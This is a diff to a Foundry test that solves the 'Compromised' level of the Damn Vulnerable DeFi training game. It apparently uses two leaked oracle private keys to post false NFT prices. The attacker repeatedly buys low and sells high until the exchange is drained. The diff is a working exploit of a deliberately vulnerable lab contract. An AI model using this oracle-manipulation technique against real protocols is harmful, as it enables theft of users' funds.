@@ -72,10 +72,65 @@ contract Compromised is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    function singleRound(address user1, address user2) public {
+        vm.prank(user1);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+        vm.prank(user2);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        
+        vm.prank(user1);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+        vm.prank(user2);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+    }
+
+    function lastRound(address user1, address user2) public {
+        vm.prank(user1);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+        vm.prank(user2);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        
+        vm.prank(user1);
+        trustfulOracle.postPrice("DVNFT", 1000 ether);
+        vm.prank(user2);
+        trustfulOracle.postPrice("DVNFT", 1000 ether);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        vm.prank(user1);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+        vm.prank(user2);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+    }
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+        address user1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        address user2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+        console.log("user1 address: ", user1);
+        console.log("user2 address: ", user2);
+
+        for (int i = 0; i < 9; i++) {
+            singleRound(user1, user2);
+        }
+
+        lastRound(user1, user2);
 
         /**
          * EXPLOIT END *
